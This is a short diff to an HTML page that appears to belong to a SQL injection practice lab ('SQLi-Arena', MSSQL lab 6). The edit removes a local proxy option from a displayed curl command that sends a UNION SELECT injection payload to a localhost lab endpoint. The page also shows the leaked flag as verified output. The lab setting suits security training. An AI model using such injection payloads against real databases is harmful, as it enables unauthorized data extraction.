@@ -115,7 +115,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab6" \<br> --data-urlencode "id=' UNION SELECT 'LEAKED', flag FROM flags -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab6" \<br> --data-urlencode "id=' UNION SELECT 'LEAKED', flag FROM flags -- -"<br><br>
         <span class="prompt"># Verified output:</span><br>
         <strong>Title:</strong> LEAKED | <strong>Content:</strong> FLAG{ms_st4ck3d_full_ctrl}
     </div>
